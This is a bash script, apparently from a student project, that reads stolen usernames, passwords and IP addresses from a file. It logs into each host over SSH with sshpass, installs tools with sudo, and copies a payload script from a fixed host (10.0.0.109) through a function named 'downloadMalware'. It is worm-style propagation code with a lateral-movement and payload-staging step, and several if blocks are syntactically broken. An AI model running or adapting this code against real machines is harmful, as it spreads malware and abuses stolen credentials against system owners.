##!/bin/bash -x

Red=$'\e[1;31m'
Green=$'\e[1;32m'
Blue=$'\e[1;34m'
Yellow=$'\e[1;33m'
Reset=$'\e[0,m'


login () { #pass, user, ip
	echo "$Blue Trying to login $2... $Reset"
	sshpass -p "$1" ssh -t -t "$2"@"$3" -p 22  &
	sleep 1

	sshpass -p "$1" ssh "$2"@"$3" "$(declare -f installsshpass "$1");installsshpass "$1""
	sshpass -p "$1" ssh "$2"@"$3" "$(declare -f createPath "$2");createPath "$2""

	sshpass -p "$1" ssh "$2"@"$3" "$(declare -f downloadMalware "$1"  "$2");downloadMalware "$1" "$2""

}

installsshpass () {
	echo "$Blue Installing sshpass ... $Reset"
	echo "$1" | sudo -S apt-get update
	echo "$1" | sudo -S apt-get install sshpass

	if [$? -eq 0];
		then
			echo "$Yellow ##################################################### $Reset"
			echo "$Green sshpass is installed !!! $Reset"
			echo "$Yellow ##################################################### $Reset"
		else
			echo "$Red sshpass is not installed. May be already installed.!!! $Reset"
}

createPath () {
	echo "$Blue Creating directory to download... $Reset"
	mkdir /home/${1}/Documents/FYP
	if [$? -eq 0];
		then
			echo "$Yellow ##################################################### $Reset"
			echo "$Green Directory created!!! $Reset"
			echo "$Yellow ##################################################### $Reset"
		else
			echo "$Red Directory is not created. May be already exist.!!! $Reset"
}

downloadMalware () {
	echo "$Blue Downloading ... $Reset"
	echo "$1" | sshpass -p "1234" scp root@10.0.0.109:/home/host/Documents/FYP/download.sh /home/${2}/Documents/FYP
	if [$? -eq 0];
		then
			echo "$Yellow ##################################################### $Reset"
			echo "$Green Successfully downloaded!!! $Reset"
			echo "$Yellow ##################################################### $Reset"
		else
			echo "$Red Download failed. $Reset"
}


while read -r line;
do
	IFS=" " read -ra ADDR <<<"$line"

	for i in "${ADDR[0]}";
	do
	USER="$i"
	done

	for i in "${ADDR[1]}";
	do
	PASS="$i"
	done

	for i in "${ADDR[2]}";
	do
	IP="$i"
	done

	login $PASS $USER $IP &


done < output.txt
exit
